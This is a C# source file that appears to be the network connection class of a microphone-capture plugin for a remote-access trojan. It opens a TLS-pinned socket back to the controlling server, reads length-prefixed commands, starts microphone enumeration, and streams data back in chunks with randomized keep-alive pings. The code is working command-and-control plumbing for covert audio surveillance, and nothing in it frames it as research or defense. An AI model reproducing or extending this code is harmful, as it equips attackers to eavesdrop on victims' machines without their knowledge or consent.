using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Plugin
{
    public static class Connection
    {
        public static Socket TcpClient { get; set; }
        public static SslStream SslClient { get; set; }
        public static X509Certificate2 ServerCertificate { get; set; }
        private static byte[] Buffer { get; set; }
        private static long HeaderSize { get; set; }
        private static long Offset { get; set; }
        private static Timer Tick { get; set; }
        public static bool IsConnected { get; set; }
        private static object SendSync { get; } = new object();
        public static string Hwid { get; set; }

        public static void InitializeClient()
        {
            try
            {
                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[0],
                    Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[1]));

                if (TcpClient.Connected)
                {
                    Debug.WriteLine("Microphone Plugin Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.None, false);
                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Tick = new Timer(new TimerCallback(CheckServer), null,
                        new Random().Next(15 * 1000, 30 * 1000),
                        new Random().Next(15 * 1000, 30 * 1000));
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServerData, null);

                    new Thread(() => Packet.GetMicrophones()).Start();
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch
            {
                Debug.WriteLine("Microphone Plugin Disconnected!");
                IsConnected = false;
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#else
            return ServerCertificate.Equals(certificate);
#endif
        }

        public static void Disconnected()
        {
            try
            {
                IsConnected = false;
                Packet.StopCapture();
                Tick?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
            catch { }
        }

        public static void ReadServerData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }

                int received = SslClient.EndRead(ar);
                if (received > 0)
                {
                    Offset += received;
                    HeaderSize -= received;

                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        Debug.WriteLine("/// Microphone Plugin Buffersize " + HeaderSize + " Bytes  ///");

                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];

                            while (HeaderSize > 0)
                            {
                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                            }

                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }

                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch
            {
                IsConnected = false;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || msg == null) return;

                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            int read;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();
                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }

                    Debug.WriteLine("Microphone Plugin Packet Sent");
                }
                catch
                {
                    IsConnected = false;
                }
            }
        }

        private static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping!)";
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }
    }
}
